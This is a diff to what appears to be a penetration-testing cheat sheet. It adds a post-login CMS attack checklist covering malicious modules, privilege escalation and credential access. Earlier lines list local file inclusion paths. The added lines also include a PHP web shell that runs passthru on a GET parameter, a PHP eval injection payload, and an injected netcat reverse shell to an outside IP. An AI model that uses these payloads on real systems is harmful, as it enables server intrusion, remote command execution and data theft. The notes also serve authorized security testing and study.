@@ -51,3 +51,28 @@ bak,cgi,ps1,py,ini,js,sh,.php,.txt,.json,.html
 - ?file=../../../../var/log/apache2/access.log
 - ?file=../../../../var/www/html/index.php
 ```
+
+**Also this included :**
+```bash
+#Success Login
+- Version (Exploit-db)
+- File Upload
+- User privilege might change 
+- Code execution directly a new post/page
+- Module? Extension? Addons?
+- Create own Module, extension, addone (Malicious)
+- Access through CMS to sensitive database information credentaisl
+- Can we schedule any system level jobs?
+- Escalate to Administration privilege
+- Diagnostic Tools - System Level Execute?
+- Configuration File?
+- Modify or Inject php code on existing file?
+<?php
+<pre>
+passthru($_GET['cmd']);
+</pre>
+?>
+- page=index');eval('phpinfo();');#
+- page=index');eval("(system('nc 10.10.10.10 443 -e /bin/bash');");#
+
+```
